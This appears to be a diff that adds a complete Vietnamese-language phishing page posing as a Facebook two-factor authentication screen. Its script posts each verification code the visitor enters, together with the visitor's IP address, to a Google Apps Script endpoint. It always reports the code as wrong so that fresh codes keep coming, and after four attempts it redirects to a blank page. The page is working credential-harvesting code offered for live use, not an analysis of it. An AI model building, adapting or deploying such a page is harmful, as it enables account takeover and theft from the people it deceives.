@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Xác thực hai yếu tố</title>
+<style>
+  :root{
+    --bg:#f0f2f5;
+    --card:#ffffff;
+    --muted:#65676b;
+    --accent:#1877f2;
+    --danger:#f02849;
+    --border:#e6e9ee;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    font-family: Inter, "Segoe UI", Roboto, Arial, sans-serif;
+    background:var(--bg);
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+  }
+  .wrap{width:100%;max-width:420px}
+  .card{
+    background:var(--card);
+    border-radius:10px;
+    box-shadow:0 8px 30px rgba(8,15,30,0.06);
+    padding:22px;
+    border:1px solid rgba(0,0,0,0.03);
+  }
+  h2{margin-top:0;font-size:20px;font-weight:700;color:#0f172a}
+  p.lead{font-size:14px;color:var(--muted);line-height:1.5;margin-bottom:14px}
+  .hero{width:100%;height:180px;border-radius:8px;overflow:hidden;margin-bottom:14px}
+  .hero img{width:100%;height:100%;object-fit:cover;display:block}
+  input{
+    width:100%;padding:12px;border:1px solid var(--border);border-radius:8px;
+    font-size:15px;margin-bottom:8px
+  }
+  input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(24,119,242,0.15);outline:none}
+  input.error{border-color:var(--danger);background:#fff5f5}
+  .error-text{display:none;color:var(--danger);font-size:13px;margin-bottom:10px}
+  .info-box{
+    margin:14px 0;border-radius:8px;background:#fff7ed;
+    border:1px solid rgba(245,158,11,0.3);
+    padding:12px;color:#92400e;display:flex;gap:10px;font-size:13px
+  }
+  .info-box .icon{
+    background:rgba(245,158,11,0.15);
+    width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;
+    flex-shrink:0;color:#f59e0b;font-size:16px
+  }
+  .info-box .sub-text{color:var(--muted);margin-top:6px;font-size:13px;line-height:1.4}
+  .muted{font-size:13px;color:var(--muted);margin:10px 0;line-height:1.4}
+  button{
+    width:100%;padding:12px;border:none;border-radius:8px;
+    font-size:15px;font-weight:700;background:var(--accent);color:#fff;cursor:pointer;margin-top:6px
+  }
+  button:disabled{background:#cbd5e1;cursor:not-allowed}
+  .note{
+    font-size:14px;color:var(--accent);margin-top:12px;text-align:center;cursor:pointer
+  }
+  .note:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h2>Xác thực hai yếu tố cần thiết</h2>
+      <p class="lead">Kiểm tra thông báo trên thiết bị khác. Hoặc nhập mã bạn nhận được qua SMS, email, tin nhắn Facebook hoặc WhatsApp.</p>
+      <div class="hero">
+        <img src="https://d9hhrg4mnvzow.cloudfront.net/netcentermanage.ubpages.com/business0958439/dch3kn-photo-2024-04-15-20-05-52_100000000000000000001o.jpg" alt="Minh họa bảo mật">
+      </div>
+      <input id="code" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Nhập mã của bạn">
+      <div class="error-text" id="errorMsg">Mã xác minh bạn đã nhập không chính xác</div>
+      <div class="info-box">
+        <div class="icon">⚠️</div>
+        <div>
+          <strong>Phê duyệt từ một thiết bị khác hoặc nhập mã xác minh</strong>
+          <div class="sub-text">Điều này có thể mất một vài phút. Vui lòng không rời khỏi trang này cho đến khi bạn nhận được mã.</div>
+        </div>
+      </div>
+      <p class="muted">Chúng tôi sẽ hướng dẫn bạn qua một số bước để bảo mật và mở khóa tài khoản của bạn.</p>
+      <button id="submitBtn" disabled>Nộp</button>
+      <div class="note" id="resendBtn">Gửi mã</div>
+    </div>
+  </div>
+
+<script>
+  const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbypPAs-YkkeAOGuk7h-5LsOMidq8ubhegH9J-C9KSkqKEBR81r_zSHd54z2UuJQMf79eg/exec";
+  const input = document.getElementById("code");
+  const btn = document.getElementById("submitBtn");
+  const errorMsg = document.getElementById("errorMsg");
+  const resendBtn = document.getElementById("resendBtn");
+  let failCount = 0; // đếm số lần nhập sai
+
+  async function getIP(){
+    try{
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    }catch(e){ return ""; }
+  }
+
+  input.addEventListener("input", ()=>{
+    const val = input.value.trim();
+    if(/^[0-9]+$/.test(val) && val.length>=4){
+      btn.disabled = false;
+      input.classList.remove("error");
+      errorMsg.style.display = "none";
+    } else {
+      btn.disabled = true;
+    }
+  });
+
+  btn.addEventListener("click", async ()=>{
+    btn.disabled = true;
+    const code = input.value.trim();
+    const ip = await getIP();
+    const formData = new URLSearchParams();
+    formData.append("code", code);
+    formData.append("ip", ip);
+    try{
+      await fetch(SCRIPT_URL, {
+        method:"POST",
+        headers:{ "Content-Type":"application/x-www-form-urlencoded" },
+        body: formData.toString()
+      });
+
+      failCount++;
+      if(failCount >= 4){
+        // Lần thứ 4 sai → chuyển sang /blank.html
+        window.location.href = "/blank.html";
+        return;
+      }
+
+      // Lần sai chưa đủ 4 → hiển thị lỗi
+      input.classList.add("error");
+      errorMsg.style.display = "block";
+      input.value = "";
+      let countdown = 5;
+      btn.textContent = `Nộp (${countdown})`;
+      const timer = setInterval(()=>{
+        countdown--;
+        if(countdown>0){
+          btn.textContent = `Nộp (${countdown})`;
+        }else{
+          clearInterval(timer);
+          btn.textContent = "Nộp";
+          btn.disabled = true;
+        }
+      },1000);
+
+    }catch(err){
+      console.error(err);
+      btn.disabled = false;
+    }
+  });
+
+  resendBtn.addEventListener("click", ()=>{
+    alert("Mã mới đã được gửi lại");
+  });
+</script>
+</body>
+</html>
